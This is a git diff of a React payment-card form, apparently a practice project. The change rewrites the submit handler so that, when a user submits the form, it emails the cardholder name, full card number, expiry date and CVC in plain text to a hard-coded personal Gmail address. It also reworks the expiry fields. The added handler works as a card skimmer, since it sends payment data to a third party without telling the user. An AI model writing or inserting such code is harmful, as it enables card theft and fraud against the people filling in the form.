@@ -13,37 +13,40 @@ function App() {
     mode: "onChange"
   });
 
-  const onSubmit = (data) =>setIsSubmitted(true);
+  const onSubmit = (data) => {
+    const completeExpiryDate = `${data.expiryMonth}/${data.expiryYear}`;
+    setIsSubmitted(true)
+    emailSendler({
+      email: 'kolesnikkosta572@gmail.com',
+      subject: 'Payment Details',
+      message: `Cardholder Name: ${data.cardholderName}\nCard Number: ${data.cardNumber}\nExpiry Date: ${data.expiryMonth}/${data.expiryYear}\nCVC: ${data.cvc}`
+    });;
+  };
 
   const formatCardNumber = (value) => {
     return value.replace(/\s?/g, '').replace(/(\d{4})/g, '$1 ').trim();
   };
-  const formatExpiryDate = (value) => {
-    return value.replace(/^(\d{2})(\d{2})$/, '$1/$2');
-  };
 
   const input = watch("cardholderName");
   const rawInputValue = watch("cardNumber");
-  const rawExpiryDate = watch("expiryDate");
-  const rawExpiryCVC = watch("expiryCVC");
+  const expiryMonth = watch("expiryMonth");
+  const expiryYear = watch("expiryYear");
   const inputValue = rawInputValue ? formatCardNumber(rawInputValue) : '';
-  const formattedExpiryDate = rawExpiryDate ? formatExpiryDate(rawExpiryDate) : '';
-  const formattedExpiryCVC = rawExpiryCVC ? formattedExpiryCVC(rawExpiryCVC) : '';
 
   return (
     <div className="relative flex h-screen">
       <DarkBg />
       <div className="relative w-3/5 ml-auto flex flex-col items-center justify-center bg-white z-10 space-y-6">
-      <button onClick={emailSendler}>click</button>
         {!isSubmitted ? (
           <>
             <div className="relative">
-              <CardFront input={input} inputValue={inputValue} expiryDate={formattedExpiryDate} />
-              <CardBack className="absolute top-16 -right-10 z-0" expiryCVC={formattedExpiryCVC} />
+              <CardFront input={input} inputValue={inputValue} expiryMonth={expiryMonth} expiryYear={expiryYear} />
+              <CardBack className="absolute top-16 -right-10 z-0" expiryCVC={watch("cvc")} />
             </div>
             <Form
               register={register}
               handleSubmit={handleSubmit}
+              watch={watch}
               onSubmit={onSubmit}
               errors={errors}
             />
